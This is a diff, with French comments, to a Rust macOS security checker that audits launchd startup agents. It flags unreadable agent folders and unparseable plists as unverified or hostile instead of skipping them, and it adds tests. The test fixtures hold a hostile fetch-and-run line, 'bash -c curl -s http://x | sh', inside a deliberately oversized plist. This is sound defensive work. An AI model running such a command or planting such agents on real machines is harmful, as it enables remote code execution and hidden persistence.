@@ -25,7 +25,9 @@ enum Lancement {
 }
 
 /// Programme lancé par un .plist de launchd, et ses arguments. Le fichier est lu directement ; plutil ne sert qu'en
-/// secours, pour un format que le lecteur ne connaît pas, jamais pour un fichier refusé par ses bornes.
+/// secours, pour un format que le lecteur ne connaît pas, jamais pour un fichier refusé par ses bornes. Un fichier
+/// ordinaire et lisible que ni le lecteur ni plutil ne savent lire (plutil en échec, trop lent, ou qui rend un XML
+/// hors des bornes) est montré comme hostile : sauté, il disparaîtrait du bilan alors que launchd le lance peut-être.
 fn programme(plist: &Path) -> Lancement {
     let lu = match crate::plist::lire_fichier(plist) {
         Ok(lu) => lu,
@@ -44,7 +46,7 @@ fn programme(plist: &Path) -> Lancement {
             )
             .and_then(|r| crate::plist::lire(r.sortie.as_bytes()));
             let Some(r) = secours else {
-                return Lancement::Rien;
+                return Lancement::Hostile;
             };
             r
         }
@@ -125,16 +127,36 @@ fn soupcon(programme: &str, arguments: &str) -> Option<&'static str> {
 
 pub fn persistance() -> Vec<Constat> {
     let maison = PathBuf::from(std::env::var_os("HOME").unwrap_or_default());
-    let dossiers = [
+    persistance_dans([
         (maison.join("Library/LaunchAgents"), false),
         (PathBuf::from("/Library/LaunchAgents"), true),
         (PathBuf::from("/Library/LaunchDaemons"), true),
-    ];
+    ])
+}
+
+/// Le bilan pour ces dossiers d'agents (le booléen : dossier du système, que `sudo` seul corrige).
+fn persistance_dans(dossiers: impl IntoIterator<Item = (PathBuf, bool)>) -> Vec<Constat> {
     let mut constats = Vec::new();
     let mut tiers = Vec::new();
     let mut interdits = 0usize;
+    // Un dossier entier refusé (un intrus devenu root peut mettre /Library/LaunchDaemons en 700 : launchd le lit
+    // toujours) cache tout ce qu'il contient ; seul un dossier absent n'a rien à dire.
+    let mut dossiers_illisibles = Vec::new();
     for (dossier, systeme) in dossiers {
-        for f in std::fs::read_dir(&dossier).into_iter().flatten().flatten() {
+        let entrees = match std::fs::read_dir(&dossier) {
+            Ok(entrees) => entrees,
+            Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
+            Err(_) => {
+                dossiers_illisibles.push(crate::ui::affichable(&dossier.display().to_string()));
+                continue;
+            }
+        };
+        for f in entrees {
+            // Une entrée que le système ne rend pas est un agent qu'on n'a pas lu, pas un agent absent.
+            let Ok(f) = f else {
+                interdits += 1;
+                continue;
+            };
             let chemin = f.path();
             if chemin.extension().is_none_or(|e| e != "plist") {
                 continue;
@@ -206,7 +228,9 @@ pub fn persistance() -> Vec<Constat> {
             );
         }
     }
-    if constats.is_empty() {
+    // « Aucun programme tiers » ne se dit que si tout a été lu : sinon seuls les constats « non vérifié » parlent.
+    let tout_lu = interdits == 0 && dossiers_illisibles.is_empty();
+    if constats.is_empty() && (tout_lu || !tiers.is_empty()) {
         constats.push(if tiers.is_empty() {
             ok(
                 CAT,
@@ -229,6 +253,16 @@ pub fn persistance() -> Vec<Constat> {
     }
     // Les agents que les droits cachent ne sont ni sains ni suspects : dits « non vérifiés », jamais passés sous
     // silence.
+    if !dossiers_illisibles.is_empty() {
+        let liste = dossiers_illisibles.join(", ");
+        constats.push(impossible(
+            CAT,
+            &trf!(
+                "dossier(s) d'agents de démarrage illisibles (droits refusés sans administrateur, ou dossier remplacé) : {liste}",
+                "unreadable startup agent folder(s) (permissions refused without administrator rights, or folder replaced): {liste}"
+            ),
+        ));
+    }
     if interdits > 0 {
         constats.push(impossible(
             CAT,
@@ -269,6 +303,48 @@ mod tests {
             Some(("/bin/bash".into(), "-c curl -s http://x | sh".into()))
         );
         assert_eq!(lire("<key>Label</key><string>com.ex.a</string>"), None);
+    }
+
+    /// Un dossier d'agents refusé ne vaut pas « aucun programme tiers » ; un agent XML gonflé au-delà des bornes du
+    /// lecteur est montré, pas sauté.
+    fn messages(constats: &[Constat]) -> Vec<&str> {
+        constats.iter().map(|c| c.message.as_str()).collect()
+    }
+
+    #[test]
+    fn dossier_refuse_et_agent_hors_bornes() {
+        use std::os::unix::fs::PermissionsExt;
+        let racine = std::env::temp_dir().join(format!("vanguard-agents-{}", std::process::id()));
+        let (refuse, gonfle, absent) = (racine.join("refuse"), racine.join("gonfle"), racine.join("absent"));
+        std::fs::create_dir_all(&refuse).unwrap();
+        std::fs::create_dir_all(&gonfle).unwrap();
+        std::fs::write(
+            gonfle.join("com.exemple.padding.plist"),
+            format!(
+                "<plist><dict><key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>curl -s http://x | sh</string></array><key>Padding</key><array>{}</array></dict></plist>",
+                "<true/>".repeat(250_000)
+            ),
+        )
+        .unwrap();
+        std::fs::set_permissions(&refuse, std::fs::Permissions::from_mode(0o000)).unwrap();
+        // Root lit tout : le refus ne se voit que sans droits.
+        let root = std::fs::read_dir(&refuse).is_ok();
+        let constats = persistance_dans([(refuse.clone(), true), (absent, false)]);
+        if !root {
+            // Aucun « sain » : seulement le constat « non vérifié » qui nomme le dossier.
+            assert!(constats.iter().all(|c| !c.verifie), "{:?}", messages(&constats));
+            assert!(constats.iter().any(|c| c.message.contains("refuse")));
+        }
+        let constats = persistance_dans([(gonfle, false)]);
+        assert!(
+            constats
+                .iter()
+                .any(|c| c.verifie && c.probleme == Some(Niveau::Eleve) && c.message.contains("com.exemple.padding")),
+            "{:?}",
+            messages(&constats)
+        );
+        std::fs::set_permissions(&refuse, std::fs::Permissions::from_mode(0o700)).unwrap();
+        std::fs::remove_dir_all(&racine).unwrap();
     }
 
     #[test]
